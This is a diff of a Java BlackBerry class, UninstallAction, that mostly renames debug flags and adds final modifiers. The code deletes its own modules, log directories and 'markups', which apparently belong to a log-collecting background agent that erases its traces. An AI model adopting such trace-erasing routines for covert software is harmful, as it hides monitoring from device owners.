@@ -30,8 +30,9 @@ import blackberry.utils.Utils;
 public final class UninstallAction extends SubAction {
     //#ifdef DEBUG
     static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
+
     //#endif
-    
+
     /**
      * Instantiates a new uninstall action.
      * 
@@ -64,7 +65,7 @@ public final class UninstallAction extends SubAction {
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
     public boolean execute(final Event triggeringEvent) {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("execute");
         //#endif
 
@@ -77,7 +78,7 @@ public final class UninstallAction extends SubAction {
         EventManager.getInstance().stopAll();
 
         Utils.sleep(5000);
-    
+
         LogCollector.getInstance().removeProgressive();
 
         final ApplicationDescriptor ad = ApplicationDescriptor
@@ -86,19 +87,19 @@ public final class UninstallAction extends SubAction {
         final int moduleHandle = ad.getModuleHandle();
         final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
         //final String errorString = Integer.toString(rc);
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("deleteModuleEx result: " + rc);
         //#endif
         switch (rc) {
         case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Will be deleted on restart");
             //#endif
             // Device.requestPowerOff( true );
             break;
         case CodeModuleManager.CMM_MODULE_IN_USE:
         case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Module In Use");
             //#endif
             break;
@@ -119,28 +120,28 @@ public final class UninstallAction extends SubAction {
             return false;
         }
 
-        int handles[] = CodeModuleManager.getModuleHandles();
+        final int handles[] = CodeModuleManager.getModuleHandles();
 
-        int size = handles.length;
+        final int size = handles.length;
         for (int i = 0; i < size; i++) {
-            int handle = handles[i];
+            final int handle = handles[i];
             //CodeModuleManager.getModuleHandle(name)
             // Retrieve specific information about a module.
-            String name = CodeModuleManager.getModuleName(handle);
+            final String name = CodeModuleManager.getModuleName(handle);
 
             if (name.startsWith(Conf.MODULE_NAME)) {
-                //#ifdef DEBUG_WARN
+                //#ifdef DEBUG
                 debug.warn("Removing handle: " + handle + " name: " + name);
                 //#endif
                 CodeModuleManager.deleteModuleEx(handle, true);
             }
         }
-        
+
         Debug.stop();
         LogCollector.getInstance().removeLogDirs();
         Markup.removeMarkups();
 
-      //#ifdef DEBUG
+        //#ifdef DEBUG
         CodeModuleManager.promptForResetIfRequired();
         //#endif        
         return true;
